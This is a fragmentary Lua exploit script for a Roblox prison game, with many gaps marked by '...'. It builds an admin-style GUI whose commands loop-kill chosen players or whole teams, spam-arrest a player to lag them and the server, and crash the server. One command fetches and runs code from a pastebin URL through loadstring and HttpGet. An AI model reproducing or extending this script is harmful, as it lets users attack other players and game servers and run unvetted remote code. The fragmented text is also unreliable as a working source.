...
CmdName.BackgroundColor3 = Color3.fromRGB(0, 32, 96)
CmdName.BorderSizePixel = 0
CmdName.Size = UDim2.new(0, 250, 0, 25)
...
CmdHandler.Size = UDim2.new(0, 220, 0, 290)
...
Minimum.MouseButton1Click:Connect(function()
	if Background.BackgroundTransparency == 0 then
		...
		Background.Size = UDim2.new(0, 250, 0, 25)
...
Label.BackgroundColor3 = Color3.fromRGB(0, 32, 96)
...
Execute.BorderColor3 = Color3.fromRGB(17, 17, 17)
...
Background3.BackgroundColor3 = Color3.fromRGB(0, 32, 96)
...
Cmd[#Cmd + 1] = {Text = "script mejorado por CrazyMan#7180",Title = "My Discord"}
...
Cmd[#Cmd + 1] = {Text = "god2",Title = "Buggy"}
Cmd[#Cmd + 1] = {Text = "loopbring",Title = "loopbring gui"}
Cmd[#Cmd + 1] = {Text = "fuck",Title = "fuck gui"}
...
Cmd[#Cmd + 1] =	{Text = "loopkill / lk [plr]",Title = "Loop kills player"}
Cmd[#Cmd + 1] =	{Text = "unloopkill / unlk [plr]",Title = "Unloop kills player"}
Cmd[#Cmd + 1] =	{Text = "loopkillall / lksall",Title = "Loop kills all players"}
Cmd[#Cmd + 1] =	{Text = "loopkillguard / lkguards",Title = "Loop kills all guards"}
Cmd[#Cmd + 1] =	{Text = "loopkillinmate / lkinmates",Title = "Loop kills all inmates"}
Cmd[#Cmd + 1] =	{Text = "loopkillcriminal / lkcriminals",Title = "Loop kills all criminals"}
Cmd[#Cmd + 1] =	{Text = "unloopkillall / unlkall",Title = "Unloop kills all players"}
Cmd[#Cmd + 1] =	{Text = "unloopkillguard / unlkguard",Title = "Unloop kills all guards"}
Cmd[#Cmd + 1] =	{Text = "unloopkillinmate / unkinmates",Title = "Unloop kills all inmates"}
Cmd[#Cmd + 1] =	{Text = "unloopkillcriminal / unlkcriminals",Title = "Unloop kills all criminals"}
...
Cmd[#Cmd + 1] =	{Text = "spamarrest / sa [plr]",Title = "Spam arrest player & lag player and server"}
Cmd[#Cmd + 1] =	{Text = "unspamarrest / unsa [plr]",Title = "Stop spam arrest player"}
...
Cmd[#Cmd + 1] =	{Text = "crashfps",Title = "crashear server"}
...
Cmd[#Cmd + 1] =	{Text = "prison",Title = "Teleports to the nexus"}
...
Notify("Turn god mode on", Color3.fromRGB(0, 255, 0), "Success")
	...
	if Command("antispamarrest") or Command("antisa") then
	...
	if Command("unantispamarrest") or Command("unantisa") then
...
Frame.BackgroundColor3 = Color3.fromRGB(53, 73, 255)
Frame.Position = UDim2.new(0.248415723, 0, 0.183838382, 0)
Frame.Size = UDim2.new(0, 120, 0, 79)

TextButton.Parent = ScreenGui
TextButton.BackgroundColor3 = Color3.fromRGB(79, 161, 216)
TextButton.Position = UDim2.new(0.266159683, 0, 0.25050506, 0)
TextButton.Size = UDim2.new(0, 91, 0, 38)
...
TextLabel.BackgroundColor3 = Color3.fromRGB(53, 73, 255)
TextLabel.BorderColor3 = Color3.fromRGB(53, 73, 255)
TextLabel.Position = UDim2.new(0.261089981, 0, 0.200000003, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 14)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "CRASH FPS BY CRAZYMAN"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 12.000
Notify("Crash gui open", Color3.fromRGB(0, 255, 0), "Success")
end
	...
	if Command("loopbring") then
		loadstring(game:HttpGet("https://pastebin.com/raw/j80DG72a"))()
		Notify("Loopbring gui open", Color3.fromRGB(0, 255, 0), "Success")
	end
...
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[tbxVictim.Text].Character.HumanoidRootPart.CFrame
		...
		Notify("fuck gui open", Color3.fromRGB(0, 255, 0), "Success")
	end
	...
	if Command("loopkillguard") or Command("lkguards") or Command("loopkillsguard") or Command("loopkillsguards") or Command("loopkillcop") or Command("loopkillpolices") or Command("loopkillspolices") then
		States.LoopKill_Guards = true
		Notify("Looping kills all guards", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("unloopkillguard") or Command("unlkguards") or Command("unloopkillsguard") or Command("unloopkillsguards") or Command("unloopkillcop") or Command("unloopkillpolices") or Command("unloopkillspolices") then
		States.LoopKill_Guards = false
		Notify("Unloop kills all guards", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopkillinmate") or Command("lkinmates") or Command("loopkillsinmate") or Command("loopkillsinmates") or Command("loopkillprisoner") or Command("loopkillprisoners") then
		States.LoopKill_Inmates = true
		Notify("Looping kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("unloopkillinmate") or Command("unlkinmates") or Command("unloopkillsinmate") or Command("unloopkillsinmates") or Command("unloopkillprisoner") or Command("unloopkillprisoners") then
		States.LoopKill_Inmates = false
		Notify("Unloop kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopkillcriminal") or Command("lkcriminals") or Command("loopkillscriminal") or Command("loopkillscriminals") or Command("loopkillcrim") or Command("loopkillcrims") then
		States.LoopKill_Criminals = true
		Notify("Looping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("unloopkillcriminal") or Command("unlkcriminals") or Command("unloopkillscriminal") or Command("unloopkillscrriminals") or Command("unloopkillcrim") or Command("unloopkillcrims") then
